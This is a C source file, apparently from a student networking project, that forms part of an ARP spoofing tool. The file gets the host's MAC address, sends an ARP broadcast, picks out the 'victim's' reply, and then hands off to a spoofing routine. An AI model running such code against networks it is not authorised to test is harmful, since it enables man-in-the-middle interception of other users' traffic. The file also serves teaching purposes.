/*
** EPITECH PROJECT, 2019
** NWP_myarpspoof_2018
** File description:
** broadcast
*/

#include "myspoof.h"

void get_hostmac_addr(t_spoof *_spoof)
{
    int fd_socket;
    struct ifreq ifr = {0};

    if ((fd_socket = socket (AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        handle_error("socket() failed to get socket descriptor ioctl");
    memset (&ifr, 0, sizeof(ifr));
    snprintf (ifr.ifr_name, sizeof(ifr.ifr_name), "%s", _spoof->iface);
    if (ioctl (fd_socket, SIOCGIFHWADDR, &ifr) < 0)
        handle_error("ioctl() failed to get source MAC address ");
    memcpy(_spoof->src_mac_found, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
    close (fd_socket);
}

bool is_eth(t_spoof *_spoof, struct ethhdr *eth)
{
    if (eth->h_proto != htons(ETH_P_ARP))
        return (false);
    if (memcmp(eth->h_dest, _spoof->s_arp.sll_addr, ETH_ALEN))
        return (false);
    return (true);
}

bool is_arp(struct ether_arp *arp, t_spoof *_spoof)
{
    if (arp->ea_hdr.ar_hrd != htons(ARPHRD_ETHER))
        return (false);
    if (arp->ea_hdr.ar_pro != htons(ETH_P_IP))
        return (false);
    if (arp->ea_hdr.ar_hln != ETHER_ADDR_LEN)
        return (false);
    if (arp->ea_hdr.ar_pln != sizeof(in_addr_t))
        return (false);
    if (arp->ea_hdr.ar_op != htons(ARPOP_REPLY))
        return (false);
    if (memcmp(arp->arp_tha, _spoof->s_arp.sll_addr, ETH_ALEN))
        return (false);
    if (memcmp(arp->arp_spa, &_spoof->d_ip.s_addr, 4))
        return (false);
    if (memcmp(arp->arp_tpa, &_spoof->s_ip.s_addr, 4))
        return (false);
    return (true);
}

void rcv_arp_paquet(t_spoof *_spoof)
{
    socklen_t len = sizeof(struct sockaddr_ll);
    struct ether_arp *arp = (struct ether_arp*)(_spoof->packet
    + sizeof(struct ethhdr));

    memset(_spoof->packet, 0, ETH_DATA_LEN);
    while (!is_eth(_spoof, (struct ethhdr *)_spoof->packet)
    || !is_arp(arp, _spoof)) {
        recvfrom(_spoof->sock_fd, _spoof->packet,
        ETH_DATA_LEN, 0, (struct sockaddr *)&(_spoof->d_arp), &len);
    }
    struct ethhdr *recv = (struct ethhdr*)(_spoof->packet);
    memcpy(_spoof->buffer, recv->h_source, ETH_ALEN);
    memcpy(_spoof->d_arp.sll_addr, _spoof->buffer, ETH_ALEN);
}

void send_broadcast(t_spoof *_spoof)
{
    init_socket(_spoof);
    get_hostmac_addr(_spoof);
    memcpy(&_spoof->s_arp.sll_addr, _spoof->src_mac_found, 6);
    if (_spoof->printSpoof == false) {
        send_arp_paquet(_spoof);
        rcv_arp_paquet(_spoof);
        printf("Found victim's MAC address: ");
        printf("'%02X:%02X:%02X:%02X:%02X:%02X'\n",
        _spoof->buffer[0], _spoof->buffer[1], _spoof->buffer[2],
        _spoof->buffer[3], _spoof->buffer[4], _spoof->buffer[5]);
        memcpy(_spoof->d_arp.sll_addr, _spoof->buffer, 6);
    }
    send_spoof(_spoof);
}
